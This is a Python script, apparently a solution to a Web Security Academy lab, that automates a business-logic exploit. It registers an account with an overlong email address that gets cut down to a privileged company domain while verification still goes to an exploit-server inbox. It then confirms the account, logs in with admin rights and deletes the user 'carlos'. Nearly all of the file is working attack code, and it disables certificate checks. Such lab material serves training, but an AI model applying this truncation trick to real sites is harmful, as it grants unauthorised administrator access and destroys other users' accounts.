import requests
import json
import sys
import urllib3
from bs4 import BeautifulSoup
from urllib.parse import urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

#this method extract exploit server email client at run time
def email_client(session, main_url):
    r = session.get(main_url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    # Find the <a> tag with 'exploit-server.net/email' in the href attribute 
    specific_link = soup.find('a', href=lambda href: href and 'exploit-server.net/email' in href)
    # Store the full URL in a variable 
    email_client_url = specific_link.get('href') if specific_link else None
    # Print the full URL if found 
    if email_client_url: 
        print("Exploit server URL is: ", email_client_url) 
    else: 
        print("Link not found")
    return email_client_url
    
# This method fetches the csrf token from url and returns csrf token
def get_csrf_token(session, url):
    r = session.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf_input = soup.find("input", {'name': 'csrf'})
    if csrf_input:
        csrf = csrf_input['value']
    else:
        raise ValueError("CSRF token not found")
    return csrf

# Retrieve csrf token from get_csrf_token method for every post request
def register(session, register_url, main_url):
    #register_url=https://0a7f002404ed213e80d521c900ae00e6.web-security-academy.net/register
    csrf_token = get_csrf_token(session, register_url)
    # Register as the test2
    print("===================================================================")
    print("Please register with username and password")
    print("===================================================================")
    user_name = "test2"
    password = "test1234"
    print("===================================================================")
    print("(+) Registering with", user_name)
    print("===================================================================")
    reg_email_part=user_name+".dontwannacry.com.dontwannacry.dontwannacry.dontwannacry.dontwannacry.dontwannacry.dontwannacry.dontwannacry.dontwannacry.dontwannacry.dontwannacry.dontwannacry.dontwannacrydontwannacry.comdontwannacry.comqqqqqqqqqqqqqqqqqqqqqqqqqqqq@dontwannacry.com."
    runtime_url = email_client(session, main_url)
    # Parse the URL to extract the domain name
    parsed_url = urlparse(runtime_url) 
    domain_name = parsed_url.netloc
    # Create the desired format 
    email_domain = f"{domain_name}"
    print("===================================================================")
    print("email domain",email_domain)
    print("===================================================================")
    reg_email=reg_email_part + email_domain
    print("===================================================================")
    print("Regestering with email ID: ",reg_email)
    print("===================================================================")
    #sending post request to register
    data_register = {"csrf": csrf_token, "username": user_name, "email": reg_email, "password": password}
    reg_resp = session.post(register_url, data=data_register, verify=False, proxies=proxies)
    print("===================================================================")
    print("Regestering with email ID: ",reg_email)
    print("===================================================================") 
    exploit_server_url = session.get(runtime_url, verify=False, proxies=proxies)  
    # Check if the request was successful if response.status_code == 200:   
    if exploit_server_url.status_code == 200:
        # Parse the HTML content with BeautifulSoup
        soup = BeautifulSoup(exploit_server_url.content, 'html.parser')
        # Find the <a> tag with the specific verification link
        verification_link_tag = soup.find('a', href=lambda href: href and 'register?temp-registration-token=' in href)
        # Extract the href attribute (verification URL) from the <a> tag
        if verification_link_tag:
            verification_url = verification_link_tag.get('href') 
            print("Verification URL found:", verification_url)
            # Send a GET request to the verification URL
            temp_registration_token = session.get(verification_url)
            print(temp_registration_token.content)
            # Check if the request was successful
            if temp_registration_token.status_code == 200:
                print("===================================================================") 
                print("Account registration successful!")
                print("===================================================================")
                # You can process the verification response here if needed
            else:
                print("===================================================================")
                print("Account registration is not successful!. Status code:", temp_registration_token.status_code)
                print("===================================================================") 
        else:
            print("===================================================================") 
            print("Verification URL not found in the response.")
            print("===================================================================") 
    else:
        print("===================================================================") 
        print("Failed to access the email page. Status code:", exploit_server_url.status_code)
        print("===================================================================") 
    
def login(session, login_url, main_url):
    csrf_token = get_csrf_token(session, login_url)
    # Login as the user
    print("===================================================================") 
    user_name_login = input("Please enter username to login: ")
    print("===================================================================") 
    password_login = input("Please enter password to login: ")
    print("===================================================================") 
    print("(+) Logging in as the user: ", user_name_login)
    print("===================================================================") 
    data_login = {"csrf": csrf_token, "username": user_name_login, "password": password_login}
    r = session.post(login_url, data=data_login, verify=False, proxies=proxies)
    if "Log out" in r.text:
        print("===================================================================") 
        print("(+) Successfully logged in as the user: ", user_name_login)
        print("===================================================================") 
        if "Admin panel" in r.text:
            print("===================================================================") 
            print("(+) Successfully esclated admin previlliges")
            deleting_url = main_url+ "/admin/delete?username=carlos"
            deleting_user_res = session.get(deleting_url, verify=False, proxies=proxies)
            if "Congratulations" in deleting_user_res.text:
                print("===================================================================") 
                print("(+) Successfully exploited the business logic vulnerability Lab")
            else:
                print("===================================================================") 
                print("(-) Could not exploit the business logic vulnerability.")
                sys.exit(-1)
        else:
            print("(-) Could not login as admin")
    else:
        print("(-) Could not login as user.", user_name_login)
        
def main():    
    if len(sys.argv) != 2:
        print("Warning!\nNot enough arguments! Please provide by following below usage command and Example")
        print("(+) Usage command: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    session = requests.Session()
    main_url = sys.argv[1]
    login_url = main_url + "/login"
    register_url = main_url + "/register"
    #cart_url = main_url + "/cart"
    #coupon_url = cart_url+ "/coupon"
    #check_out_url = cart_url + "/checkout"
    #main_url=https://0a7f002404ed213e80d521c900ae00e6.web-security-academy.net
    register(session, register_url, main_url)
    login(session,login_url, main_url)
    #update_email(session, main_url)

if __name__ == "__main__":
    main()